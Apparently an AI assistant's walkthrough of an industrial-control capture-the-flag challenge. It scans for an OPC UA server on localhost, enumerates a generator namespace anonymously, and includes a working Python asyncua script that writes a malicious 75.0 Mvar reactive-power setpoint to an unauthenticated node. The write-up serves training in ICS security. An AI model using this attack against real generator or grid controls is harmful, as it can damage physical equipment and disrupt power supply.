Viewed service_availability_ttp.yaml:1-22
Viewed Red-Writeup.md:1-25

Here is the complete, step-by-step solution for Challenge 6 (**Generator Reactive-Power Setpoint**). 

This challenge focuses on the **OPC UA** protocol, which is a modern, highly popular ICS communication standard.

### Step 1: Network Discovery (Scanning for OPC UA)
First, the participant scans the network to locate the industrial service. OPC UA almost always runs on TCP port 4840.
```bash
nmap -p 4840 127.0.0.1
```
*Result:* Port 4840 is confirmed to be open.

### Step 2: Namespace Enumeration
Unlike older protocols (like Modbus or DNP3) that just use raw memory addresses, OPC UA has a rich, human-readable directory structure (called a "Namespace"). 

Participants use an OPC UA client (like the GUI tool *UaExpert* or a Python `asyncua` script) to connect to `opc.tcp://127.0.0.1:4840` without credentials (Anonymous Login). 

They browse the directory tree and navigate to `Objects -> Generator1`. Inside, they see several variables (nodes):
* `ActivePower`
* `Voltage`
* `FieldExcitationCurrent`
* `RotorSpeed`
* `ReactivePowerSetpoint`

### Step 3: Identify the Vulnerability
The participant attempts to read/write to these nodes. They will discover:
1. `Voltage` and `ActivePower` are Read-Only (attempting to write to them will fail).
2. The `ReactivePowerSetpoint` node (specifically Node ID: `ns=2;i=5`) manages how the generator handles power load.
3. Crucially, the server is misconfigured: **It allows unauthenticated users to Write to the ReactivePowerSetpoint.**

### Step 4: Execution (The Attack)
The normal baseline for the Reactive Power Setpoint is around `10.0 Mvar`. To successfully attack the system, the participant must write a massive, out-of-bounds value (e.g., `75.0 Mvar`) to that node to destabilize the generator.

Using a Python `asyncua` script (or a GUI client), they execute the payload:
```python
import asyncio
from asyncua import Client

async def attack():
    # Connect to the vulnerable OPC UA Server
    client = Client("opc.tcp://127.0.0.1:4840")
    await client.connect()

    # Target the ReactivePowerSetpoint Node (Namespace 2, Index 5)
    target_node = client.get_node("ns=2;i=5")
    
    # Inject the malicious 75.0 Mvar Setpoint
    await target_node.write_value(75.0)
    print("Malicious setpoint injected!")
    
    await client.disconnect()

asyncio.run(attack())
```

### Step 5: Verification
As soon as the malicious setpoint (`75.0`) is pushed to the server, the server-side logic detects the massive parameter deviation (> 15.0 Mvar) and triggers the backend alarm. 

**Challenge Completed!**
